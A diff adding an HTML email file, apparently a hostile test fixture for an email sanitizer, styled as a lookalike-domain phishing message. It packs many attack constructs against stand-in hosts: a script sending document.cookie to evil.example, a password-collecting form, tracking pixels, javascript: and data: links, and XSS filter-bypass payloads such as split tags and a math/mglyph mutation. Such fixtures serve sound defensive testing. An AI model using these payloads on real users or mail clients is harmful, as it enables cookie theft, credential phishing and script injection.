@@ -1,0 +1,43 @@
+From: "Account Team" <security@paypa1.example>
+To: sam@rivera.example
+Subject: Action required: confirm your account
+Message-ID: <hostile-1@paypa1.example>
+Date: Mon, 29 Jun 2026 03:00:00 +0000
+MIME-Version: 1.0
+Content-Type: text/html; charset=utf-8
+
+<html><head>
+<meta http-equiv="refresh" content="0; url=https://evil.example/landing">
+<meta http-equiv="Content-Security-Policy" content="default-src *; script-src * 'unsafe-inline'">
+<base href="https://evil.example/">
+<link rel="dns-prefetch" href="//track.evil.example">
+<link rel="preconnect" href="https://track.evil.example">
+<link rel="prefetch" href="https://track.evil.example/prefetch">
+<link rel="stylesheet" href="https://evil.example/remote.css">
+<style>@import url("https://evil.example/import.css"); body { background: url(https://track.evil.example/bg.gif); }</style>
+<script>fetch('https://evil.example/steal?c=' + document.cookie)</script>
+<script src="https://evil.example/x.js"></script>
+</head>
+<body onload="alert(1)">
+<p>Your account is on hold. <a href="javascript:alert(document.domain)">Confirm here</a>.</p>
+<p><a href="https://evil.example/login" target="_self" ping="https://track.evil.example/ping">Sign in</a></p>
+<img src="https://track.evil.example/open.gif" onerror="fetch('https://evil.example/err')" width="1" height="1">
+<img srcset="https://track.evil.example/1x.gif 1x, https://track.evil.example/2x.gif 2x" alt="">
+<div style="background-image:url('https://track.evil.example/div.gif')">styled</div>
+<form action="https://evil.example/collect" method="post">
+  <input name="password" type="password" placeholder="Password">
+  <button type="submit" formaction="https://evil.example/collect2">Confirm</button>
+</form>
+<iframe src="https://evil.example/frame" srcdoc="<script>alert(1)</script>"></iframe>
+<object data="https://evil.example/flash.swf"></object>
+<embed src="https://evil.example/plugin">
+<svg><script>alert(1)</script><a xlink:href="javascript:alert(2)"><text>svg</text></a></svg>
+<video src="https://track.evil.example/v.mp4" autoplay></video>
+<audio src="https://track.evil.example/a.mp3" autoplay></audio>
+<a href="  JaVaScRiPt:alert(3)">tricky</a>
+<a href="data:text/html,<script>alert(4)</script>">data link</a>
+<scr<script>ipt>alert(5)</script>
+<noscript><img src="https://track.evil.example/noscript.gif"></noscript>
+<template><img src="https://track.evil.example/template.gif"></template>
+<math><mtext><table><mglyph><style><img src=x onerror=alert(6)></style></mglyph></table></mtext></math>
+</body></html>
